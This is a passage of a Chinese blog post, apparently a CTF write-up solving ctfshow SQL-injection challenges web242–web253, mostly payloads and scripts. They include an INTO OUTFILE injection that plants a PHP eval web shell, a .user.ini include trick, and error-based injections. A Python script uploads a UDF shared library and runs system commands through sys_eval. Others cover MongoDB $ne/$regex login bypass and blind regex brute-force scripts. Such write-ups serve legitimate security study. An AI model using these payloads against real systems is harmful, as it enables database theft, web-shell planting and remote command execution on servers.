<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">sql语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//备份表
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select * from ctfshow_user into outfile &#39;/var/www/html/dump/</span><span class="si">{</span><span class="nv">$filename</span><span class="si">}</span><span class="s2">&#39;;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//无过滤
</span></span></span></code></pre></div><pre tabindex="0"><code>outfile的语法

SELECT ... INTO OUTFILE &#39;file_name&#39;
        [CHARACTER SET charset_name]
        [export_options]

export_options:
    [{FIELDS | COLUMNS}
        [TERMINATED BY &#39;string&#39;]//分隔符
        [[OPTIONALLY] ENCLOSED BY &#39;char&#39;]
        [ESCAPED BY &#39;char&#39;]
    ]
    [LINES
        [STARTING BY &#39;string&#39;]
        [TERMINATED BY &#39;string&#39;]
    ]

----------------------------------------------------
“OPTION”参数为可选参数选项，其可能的取值有：

FIELDS TERMINATED BY &#39;字符串&#39;：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。

FIELDS ENCLOSED BY &#39;字符&#39;：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。

FIELDS OPTIONALLY ENCLOSED BY &#39;字符&#39;：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。

FIELDS ESCAPED BY &#39;字符&#39;：设置转义字符，只能为单个字符。默认值为“\”。

LINES STARTING BY &#39;字符串&#39;：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。

LINES TERMINATED BY &#39;字符串&#39;：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。
</code></pre><p>漏洞的注入点是由于数据库的导出功能</p>
<p><img alt="image-20250218160941925" loading="lazy" src="../assets/image-20250218160941925.png"></p>
<p>根据这个我们可以写入一句话木马</p>
<p>payload:</p>
<pre tabindex="0"><code>filename=1.php&#39; LINES STARTING BY &#39;&lt;?php eval($_POST[1]);?&gt;&#39;#
</code></pre><p><img alt="image-20250218161133251" loading="lazy" src="../assets/image-20250218161133251.png"></p>
<p><img alt="image-20250218161332604" loading="lazy" src="../assets/image-20250218161332604.png"></p>
<h4 id="web243">web243<a hidden class="anchor" aria-hidden="true" href="#web243">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">sql语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//备份表
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select * from ctfshow_user into outfile &#39;/var/www/html/dump/</span><span class="si">{</span><span class="nv">$filename</span><span class="si">}</span><span class="s2">&#39;;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//过滤了php
</span></span></span></code></pre></div><p>尝试一下.user.ini文件包含</p>
<pre tabindex="0"><code>filename=.user.ini&#39; lines starting by &#39;auto_prepend_file=1.txt\n&#39;%23
filename=1.txt&#39; lines starting by &#39;&lt;?=eval($_POST[1])?&gt;&#39;%23
</code></pre><p><img alt="image-20250218165925067" loading="lazy" src="../assets/image-20250218165925067.png"></p>
<h4 id="报错注入">报错注入<a hidden class="anchor" aria-hidden="true" href="#报错注入">#</a></h4>
<p><a href="https://blog.csdn.net/2401_89233381/article/details/144308798">新手小白入门——SQL注入之报错注入_sql注入报错注入-CSDN博客</a></p>
<h4 id="web244">web244<a hidden class="anchor" aria-hidden="true" href="#web244">#</a></h4>
<pre tabindex="0"><code>sql语句

  //备份表
  $sql = &#34;select id,username,pass from ctfshow_user where id = &#39;&#34;.$id.&#34;&#39; limit 1;&#34;;
      
返回逻辑

  //无过滤
</code></pre><p>updatexml报错注入</p>
<p>payload</p>
<pre tabindex="0"><code>/api/?id=&#39; or updatexml(1, concat(0x7e, database(), 0x7e), 1)%23
/api/?id=&#39; or updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema = database() limit 1, 1), 0x7e), 1)%23
/api/?id=&#39; or updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_schema = database() and table_name = &#39;ctfshow_flag&#39; limit 1, 1), 0x7e), 1)%23
/api/?id=&#39; or updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_schema = database() and table_name = &#39;ctfshow_flag&#39; limit 1, 1), 0x7e), 1)%23
/api/?id=&#39; or updatexml(1, concat(0x7e, (select substr(flag, 1, 30) from ctfshow_flag), 0x7e), 1)%23
#ctfshow{89982b11-5c7d-4215-a78
/api/?id=&#39; or updatexml(1, concat(0x7e, (select substr(flag, 31, 30) from ctfshow_flag), 0x7e), 1)%23
#9-a9f8ecc8f1b1}
# 数据长度有限制，可以使用substr来截取


//ctfshow{89982b11-5c7d-4215-a789-a9f8ecc8f1b1}
</code></pre><h4 id="web245">web245<a hidden class="anchor" aria-hidden="true" href="#web245">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">sql语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select id,username,pass from ctfshow_user where id = &#39;&#34;</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s2">&#34;&#39; limit 1;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//无过滤
</span></span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="c1"></span>  <span class="nx">过滤updatexml</span>
</span></span></code></pre></div><p>extractvalue报错注入</p>
<p>payload</p>
<pre tabindex="0"><code>查数据库名：id=&#39; and (select extractvalue(1,concat(0x7e,(select database()))))%23

爆表名：id=&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))%23
//ctfshow_flagsa

爆字段名：id=&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#34;ctfshow_flagsa&#34;))))%23
//flag1

爆数据：
id=&#39; and (select extractvalue(1,concat(0x7e,(select substr(group_concat(flag1),1,30) from ctfshow_flagsa))))%23
id=&#39; and (select extractvalue(1,concat(0x7e,(select substr(group_concat(flag1),31,30) from ctfshow_flagsa))))%23

//ctfshow{41446106-c47e-434d-a0c0-16ee43375249}
</code></pre><h4 id="web246">web246<a hidden class="anchor" aria-hidden="true" href="#web246">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">sql语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select id,username,pass from ctfshow_user where id = &#39;&#34;</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s2">&#34;&#39; limit 1;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//无过滤
</span></span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="c1"></span>  <span class="nx">过滤updatexml</span> <span class="nx">extractvalue</span>
</span></span></code></pre></div><p>floor报错注入</p>
<p>原理：<a href="https://blog.csdn.net/miraclehw/article/details/129250360">SQL注入报错注入之floor()报错注入原理分析_sql注入floor-CSDN博客</a></p>
<pre tabindex="0"><code>#获取表名
1&#39; union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database()  limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23

#获取列名
1&#39; union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name=&#39;ctfshow_flags&#39;  limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23

#获取数据
1&#39; union select 1,count(*),concat(0x3a,0x3a,(select (flag2) from ctfshow_flags  limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23
</code></pre><h4 id="web247">web247<a hidden class="anchor" aria-hidden="true" href="#web247">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">sql语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select id,username,pass from ctfshow_user where id = &#39;&#34;</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s2">&#34;&#39; limit 1;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//无过滤
</span></span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="c1"></span>  <span class="nx">过滤updatexml</span> <span class="nx">extractvalue</span> <span class="nx">floor</span>
</span></span></code></pre></div><p>这道题floor函数也被ban掉了</p>
<p>根据floor报错注入的原理，其实我们可以知道，之所以会出现错误主要是因为用floor对rand(0)*2进行取整，目的输出011011&hellip;的结果，而既然这样我们只需要找一个同样能进行取整的函数来代替floor就ok了</p>
<p>除了floor之外，我们还能使用round，ceil等</p>
<p>payload</p>
<pre tabindex="0"><code>查表 
1&#39; union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database()  limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23
查列 
1&#39; union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name=&#39;ctfshow_flagsa&#39;  limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23
查数据 
1&#39; union select 1,count(*),concat(0x3a,0x3a,(select (`flag?`) from ctfshow_flagsa  limit 0,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23
</code></pre><h4 id="web248">web248<a hidden class="anchor" aria-hidden="true" href="#web248">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">sql语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select id,username,pass from ctfshow_user where id = &#39;&#34;</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s2">&#34;&#39; limit 1;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//无过滤,
</span></span></span></code></pre></div><p>UDF注入</p>
<p><a href="https://blog.csdn.net/Myon5/article/details/142146339">ctfshow-web入门-sql注入-web248-UDF 注入_ctfshow web248-CSDN博客</a></p>
<p>我们需要将 UDF 的动态链接库文件（xxx.dll文件）放到 MySQL 的检索目录下才能创建自定义函数，对于不同版本的 mysql，检索目录是不同的：</p>
<blockquote>
<p>MySQL &lt; 5.0	导出路径随意；
5.0 &lt;= MySQL&lt; 5.1	需要导出至目标服务器的系统目录（如：c:/windows/system32/）
5.1 &lt; MySQL	必须导出到MySQL安装目录下的lib\plugin文件夹下</p></blockquote>
<p>堆叠注入查版本</p>
<pre tabindex="0"><code>/api/?id=0&#39;;select version();%23
</code></pre><p><img alt="image-20250218215235779" loading="lazy" src="../assets/image-20250218215235779.png"></p>
<p>大于5.1，接着要查目录路径</p>
<pre tabindex="0"><code>/api/?id=0&#39;;select @@plugin_dir;%23
</code></pre><p><img alt="image-20250218215447848" loading="lazy" src="../assets/image-20250218215447848.png"></p>
<pre tabindex="0"><code>/usr/lib/mariadb/plugin
</code></pre><p>拿到路径，我们接下来就可以传入我们的恶意so文件了</p>
<p>sqlmap中有已经写好的 udf 文件</p>
<p>如，lib_mysqludf_sys_64.so</p>
<p><img alt="image-20250218220305454" loading="lazy" src="../assets/image-20250218220305454.png"></p>
<p>但是由于get传参有长度限制，我们需要进行分段传参</p>
<p>放一个国外大佬的脚本，将udf文件分段上传后再进行合并即可</p>
<pre tabindex="0"><code>import requests
url=&#34;http://449c0852-2873-4a47-9eb4-a854915a6b40.challenge.ctf.show/api/&#34;
udf=&#34;&#34;
udfs=[]
for i in range(0,len(udf),5000):
    udfs.append(udf[i:i+5000])
#写入多个文件中
for i in udfs:
    url1=url+f&#34;?id=1&#39;;SELECT &#39;{i}&#39; into dumpfile &#39;/tmp/&#34;+str(udfs.index(i))+&#34;.txt&#39;%23&#34;
    requests.get(url1)

#合并文件生成so文件
url2=url+&#34;?id=1&#39;;SELECT unhex(concat(load_file(&#39;/tmp/0.txt&#39;),load_file(&#39;/tmp/1.txt&#39;),load_file(&#39;/tmp/2.txt&#39;),load_file(&#39;/tmp/3.txt&#39;))) into dumpfile &#39;/usr/lib/mariadb/plugin/hack.so&#39;%23&#34;
requests.get(url2)

#创建自定义函数并执行恶意命令
requests.get(url+&#34;?id=1&#39;;create function sys_eval returns string soname &#39;hack.so&#39;%23&#34;)
r=requests.get(url+&#34;?id=1&#39;;select sys_eval(&#39;cat /f*&#39;)%23&#34;)
print(r.text)
</code></pre><h4 id="web249">web249<a hidden class="anchor" aria-hidden="true" href="#web249">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">sql语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//无
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$memcache</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//无过滤
</span></span></span></code></pre></div><p><img alt="image-20250218221510397" loading="lazy" src="../assets/image-20250218221510397.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>?id[]=flag
</code></pre><h4 id="web250">web250<a hidden class="anchor" aria-hidden="true" href="#web250">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">sql语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="nv">$query</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoDB\Driver\Query</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="nv">$cursor</span> <span class="o">=</span> <span class="nv">$manager</span><span class="o">-&gt;</span><span class="na">executeQuery</span><span class="p">(</span><span class="s1">&#39;ctfshow.ctfshow_user&#39;</span><span class="p">,</span> <span class="nv">$query</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//无过滤
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$cursor</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;登陆成功&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nx">array_push</span><span class="p">(</span><span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">],</span> <span class="nv">$flag</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p><a href="https://blog.csdn.net/Myon5/article/details/142187219">ctfshow-web入门-sql注入（web249-web253）nosql 注入_ctfshow web250-CSDN博客</a></p>
<p><img alt="image-20250218222341349" loading="lazy" src="../assets/image-20250218222341349.png"></p>
<p>在这些操作符中，$ne 就是我们在<strong>重言式注入</strong>中需要利用到的那个，它的作用是将不等于指定值的数据都查询出来，比如 $ne=1 时就是将所有不等于 1 的数据都查询出来。</p>
<p>所以payload就是</p>
<pre tabindex="0"><code>username[$ne]=1&amp;password[$ne]=1
</code></pre><p>环境好像有点问题（？）前两次一直查不出来</p>
<h4 id="web251">web251<a hidden class="anchor" aria-hidden="true" href="#web251">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">sql语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="nv">$query</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoDB\Driver\Query</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="nv">$cursor</span> <span class="o">=</span> <span class="nv">$manager</span><span class="o">-&gt;</span><span class="na">executeQuery</span><span class="p">(</span><span class="s1">&#39;ctfshow.ctfshow_user&#39;</span><span class="p">,</span> <span class="nv">$query</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//无过滤
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$cursor</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;登陆成功&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nx">array_push</span><span class="p">(</span><span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">],</span> <span class="nv">$flag</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p>同样是</p>
<pre tabindex="0"><code>username[$ne]=1&amp;password[$ne]=1
</code></pre><p><img alt="image-20250218225117048" loading="lazy" src="../assets/image-20250218225117048.png"></p>
<p>继续用上一题的 payload，返回 admin 的密码，但是这次的密码里没有 flag</p>
<p>可能flag在其他用户的密码里，我们禁用admin</p>
<pre tabindex="0"><code>username[$ne]=admin&amp;password[$ne]=1
</code></pre><p><img alt="image-20250218225555688" loading="lazy" src="../assets/image-20250218225555688.png"></p>
<p>拿到flag</p>
<h4 id="web252">web252<a hidden class="anchor" aria-hidden="true" href="#web252">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">sql语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="nv">$query</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoDB\Driver\Query</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="nv">$cursor</span> <span class="o">=</span> <span class="nv">$manager</span><span class="o">-&gt;</span><span class="na">executeQuery</span><span class="p">(</span><span class="s1">&#39;ctfshow.ctfshow_user&#39;</span><span class="p">,</span> <span class="nv">$query</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//无过滤
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$cursor</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;登陆成功&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nx">array_push</span><span class="p">(</span><span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">],</span> <span class="nv">$flag</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">      
</span></span></code></pre></div><p>这题有很多不同的username</p>
<p>我们可以考虑采用正则匹配来筛选</p>
<pre tabindex="0"><code>username[$ne]=1&amp;password[$regex]=ctfshow{
</code></pre><p>or</p>
<p>用$gt （大于）一直尝试知道拿到有flag的用户</p>
<pre tabindex="0"><code>username[$ne]=admin&amp;password[$ne]=1
username[$gt]=admin1&amp;password[$ne]=1
username[$gt]=admin2&amp;password[$ne]=1
username[$gt]=admin3&amp;password[$ne]=1
</code></pre><p>or</p>
<p>正则匹配去掉所有为admin开头的用户</p>
<pre tabindex="0"><code>username[$regex]=^[^admin].*$&amp;password[$ne]=1
</code></pre><h4 id="web253">web253<a hidden class="anchor" aria-hidden="true" href="#web253">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">sql语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//sql
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nx">db</span><span class="o">.</span><span class="nx">ctfshow_user</span><span class="o">.</span><span class="nx">find</span><span class="p">({</span><span class="nx">username</span><span class="o">:</span><span class="s1">&#39;$username&#39;</span><span class="p">,</span><span class="nx">password</span><span class="o">:</span><span class="s1">&#39;$password&#39;</span><span class="p">})</span><span class="o">.</span><span class="nx">pretty</span><span class="p">()</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//无过滤
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$cursor</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;登陆成功&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nx">array_push</span><span class="p">(</span><span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">],</span> <span class="nv">$flag</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><h5 id="方法一-1">方法一<a hidden class="anchor" aria-hidden="true" href="#方法一-1">#</a></h5>
<p><a href="https://www.cnblogs.com/recharging-runtime/p/15077477.html">CTFSHOW WEB入门 SQL注入篇 - b477eRy - 博客园</a></p>
<p>猜测到id为flag，直接布尔盲注拿到flag</p>
<pre tabindex="0"><code>import string

import requests

url = &#34;http://5ce4ea0d-afb5-4f1c-9e65-626bdaa6e433.challenge.ctf.show:8080/api/&#34;

letters = &#34;{}-_&#34; + string.ascii_lowercase + string.digits


def valid_pass(password: str) -&gt; bool:
    data = {
        &#34;username[$regex]&#34;: &#34;flag&#34;,
        &#34;password[$regex]&#34;: f&#34;{password}.*&#34;
    }
    response = requests.post(url, data=data)
    return &#34;登陆成功&#34; in response.json()[&#34;msg&#34;]


result = &#34;&#34;

while True:
    for letter in letters:
        if valid_pass(result + letter):
            result += letter
            print(f&#34;[*] result: {result}&#34;)
            break
</code></pre><h5 id="方法二">方法二<a hidden class="anchor" aria-hidden="true" href="#方法二">#</a></h5>
<pre tabindex="0"><code>import requests, time, json


def brute(action, username=&#34;&#34;):
    url = &#34;http://44e163eb-3f69-4641-83b2-5499d9c0d5ed.challenge.ctf.show/api/&#34;
    if action == &#34;username&#34;:
        res = &#34;^[^a]&#34;  # admin1的password为ctfshow666...很明显不是flag，所以禁掉admin开头的用户
    else:
        res = &#34;^ctfshow{&#34;
    for j in range(30):
        flag = False
        for i in range(127):
            reg = res
            if chr(i) not in &#34;0123456789abcdefghijklmnopqrstuvwxyz-{}:,_&#34;:
                continue
            n = chr(i)
            if chr(i) in &#34;-{}:&#34;:
                n = &#34;\\&#34;+chr(i)
            print(chr(i))
            if action == &#34;username&#34;:
                data = {&#34;username[$regex]&#34;: f&#34;{reg+n}&#34;, &#34;password[$ne]&#34;: f&#34;1&#34;}
            else:
                data = {&#34;username[$regex]&#34;: f&#34;{username}$&#34;, &#34;password[$regex]&#34;: f&#34;{reg+n}&#34;}
            while True:
                try:
                    r = requests.post(url, data=data, timeout=7)
                    break
                except TimeoutError:
                    time.sleep(0.1)
                except KeyboardInterrupt:
                    exit(0)
            try:
                resp = json.loads(r.text)
            except:
                resp = None
                continue
            if resp[&#34;msg&#34;] == &#34;\u767b\u9646\u6210\u529f&#34;:
                res += chr(i)
                flag = True
                break
        if not flag:
            break
        print(res)
    return res


if __name__ == &#39;__main__&#39;:
    username = brute(&#34;username&#34;)
    print(f&#34;用户名为: {username}&#34;)
    password = brute(&#34;password&#34;, username)
    print(f&#34;用户名: {username}\n密码: {password}&#34;)
</code></pre>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/writeup/">Writeup</a></li>
      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
      <li><a href="http://localhost:1313/tags/web/">Web</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/post/hgame2025/">
    <span class="title">« 上一页</span>
    <br>
    <span>HGAME2025-Web-Writeup</span>
  </a>
  <a class="next" href="http://localhost:1313/post/ctfshow/ctfshow_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
    <span class="title">下一页 »</span>
    <br>
    <span>CTFSHOW-反序列化-Writeup</span>
  </a>
</nav>

  </footer><div id="tw-comment"></div>
<script>
    
    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
    const setGiscusTheme = () => {
        const sendMessage = (message) => {
            const iframe = document.querySelector('iframe.giscus-frame');
            if (iframe) {
                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
            }
        }
        sendMessage({setConfig: {theme: getStoredTheme()}})
    }

